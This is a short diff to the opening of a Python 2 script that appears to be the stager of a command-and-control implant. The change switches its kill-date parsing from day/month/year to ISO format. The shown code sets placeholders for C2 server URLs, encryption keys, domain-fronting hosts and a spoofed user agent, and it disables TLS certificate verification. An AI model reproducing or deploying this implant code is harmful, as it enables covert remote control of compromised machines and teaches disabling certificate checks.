@@ -1,5 +1,5 @@
 import urllib2,os,sys,base64,ssl,socket,pwd,hashlib,time
-kdn=time.strptime("#REPLACEKILLDATE#","%d/%m/%Y")
+kdn=time.strptime("#REPLACEKILLDATE#","%Y-%m-%d")
 pyhash="#REPLACEPYTHONHASH#"
 pykey="#REPLACESPYTHONKEY#"
 key="#REPLACEKEY#"
@@ -9,7 +9,7 @@ url=serverclean[0]+"#REPLACEQUICKCOMMAND#"
 url2=serverclean[0]+"#REPLACECONNECTURL#"
 hh=[#REPLACEDOMAINFRONT#]
 ua="#REPLACEUSERAGENT#"
-cstr=time.strftime("%d/%m/%Y",time.gmtime());cstr=time.strptime(cstr,"%d/%m/%Y")
+cstr=time.strftime("%Y-%m-%d",time.gmtime());cstr=time.strptime(cstr,"%Y-%m-%d")
 # This doesn't exist in python < 2.7.9
 if sys.version_info[0] == 3 or (sys.version_info[0] == 2 and sys.version_info[1] >= 7 and sys.version_info[2] >= 9):
     ssl._create_default_https_context=ssl._create_unverified_context
